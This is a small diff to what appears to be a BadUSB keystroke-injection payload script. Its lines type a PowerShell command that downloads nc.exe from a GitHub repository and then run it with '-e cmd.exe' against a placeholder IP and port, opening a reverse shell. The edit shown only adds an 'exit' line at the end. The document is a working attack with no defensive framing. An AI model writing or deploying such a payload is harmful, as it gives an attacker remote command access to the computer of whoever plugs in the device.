@@ -7,4 +7,4 @@ CustomDelay:1000
 PrintLine:Invoke-WebRequest -Uri 'https://github.com/purpleracc00n/BadUSB_Scripts/raw/main/nc.exe' -outfile 'nc.exe'
 CustomDelay:1000
 PrintLine:./nc.exe <IP> <port> -e cmd.exe
-Delay
+PrintLine:exit
